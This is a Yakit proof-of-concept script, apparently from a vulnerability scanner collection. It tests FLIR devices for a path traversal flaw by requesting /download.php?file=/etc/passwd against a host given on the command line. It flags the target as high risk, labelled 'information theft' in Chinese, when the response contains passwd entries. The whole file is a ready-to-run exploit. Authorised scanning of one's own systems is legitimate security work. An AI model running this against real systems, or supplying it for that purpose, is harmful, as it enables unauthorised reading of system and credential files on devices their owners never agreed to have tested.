##server:flir
##type:poc
##params:root_url
##name:FLIR_path_traversal_poc
##severity:high
##out_put:FLIR_path_traversal_poc_res



yakit.AutoInitYakit()
log.setLevel("info")
poc=func(addr){
    isTls = str.IsTLSServer(addr)
    packet=`GET /download.php?file=/etc/passwd HTTP/1.1
Host: {{params(addr)}}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36`

    rsp, req, err = poc.HTTP(packet, poc.https(isTls),poc.params({"addr":addr}))
    if err != nil {
        die(err)
    }

    if str.MatchAllOfRegexp(rsp, `root:.*?:[0-9]*:[0-9]*:`)  {
        risk.NewRisk(
                root_url,
                risk.severity("high"), 
                risk.title(f"FOUND ${root_url} 存在FLIR目录遍历漏洞"), 
                risk.titleVerbose("FLIR目录遍历漏洞"), 
                risk.type("信息窃取"), 
                risk.typeVerbose("路径遍历"),                 
                risk.request(req), 
                risk.response(rsp), 
                risk.details({"FLIR_path_traversal_poc_res":true}), )
    }

}


root_url = cli.String("root_url")
ip, port, err = str.ParseStringToHostPort(root_url)
if err != nil {
    die(err)
}

addr = str.HostPort(ip, port)
poc(addr)
